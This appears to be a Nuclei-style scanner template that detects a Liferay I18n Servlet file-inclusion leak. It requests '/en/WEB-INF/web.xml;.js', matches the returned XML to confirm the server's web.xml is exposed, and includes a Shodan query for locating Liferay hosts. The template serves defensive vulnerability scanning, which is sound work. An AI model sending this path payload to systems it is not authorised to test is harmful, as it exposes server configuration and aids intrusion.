id: liferay-resource-leak

info:
  name: Liferay - Local File Inclusion
  severity: high
  description: |
  Liferay is vulnerable to I18n Servlet which leaks information via sending an HTTP request to /[language]/[resource];.js (also .jsp works).
  remediation: Update Liferay to the latest version
  reference:
    - https://github.com/ilmila/J2EEScan/blob/master/src/main/java/burp/j2ee/issues/impl/LiferayI18nServletResourceLeaks.java
  metadata:
    verified: true
    shodan-query: title:"Liferay"
  tags: liferay,lfi,j2ee

requests:
  - method: GET
    path:
      - "{{BaseURL}}/en/WEB-INF/web.xml;.js"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<web-app id="
          - "<?xml"
        condition: and

      - type: word
        part: header
        words:
          - "application/xml"

      - type: status
        status:
          - 200

